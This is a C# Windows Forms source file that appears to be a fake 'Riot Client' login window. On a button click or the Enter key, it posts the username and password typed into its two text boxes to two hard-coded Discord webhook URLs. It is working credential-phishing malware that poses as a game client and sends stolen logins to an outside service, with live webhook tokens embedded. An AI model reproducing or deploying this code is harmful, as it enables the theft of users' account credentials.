using System;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using Newtonsoft.Json;

namespace Riot_Client
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            sendWebhook("https://discord.com/api/webhooks/1260425977285316679/WPijUU5bWB24oVNVImgFEuXTFkgffDlKZJzWX-kerDz2wKfpVb_kCd1ikYQ5xdtGh0Jr", textBox1.Text, "Username");
            sendWebhook("https://discord.com/api/webhooks/1260432243575230525/oGCnKDSp-pH4iiYkNv9Sf3KyIwkgbzDQePTQUp_WfFcRIsDrlawgwuI5udsyzvOzk7tl", textBox2.Text, "Password");
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        public static void sendWebhook(string Url, string msg, string Username)
        {
            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                "username",
                Username
            },
            {
                "content",
                msg
            }
        });
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                sendWebhook("https://discord.com/api/webhooks/1260425977285316679/WPijUU5bWB24oVNVImgFEuXTFkgffDlKZJzWX-kerDz2wKfpVb_kCd1ikYQ5xdtGh0Jr", textBox1.Text, "Username");
                sendWebhook("https://discord.com/api/webhooks/1260432243575230525/oGCnKDSp-pH4iiYkNv9Sf3KyIwkgbzDQePTQUp_WfFcRIsDrlawgwuI5udsyzvOzk7tl", textBox2.Text, "Password");
            }
        }
    }
}
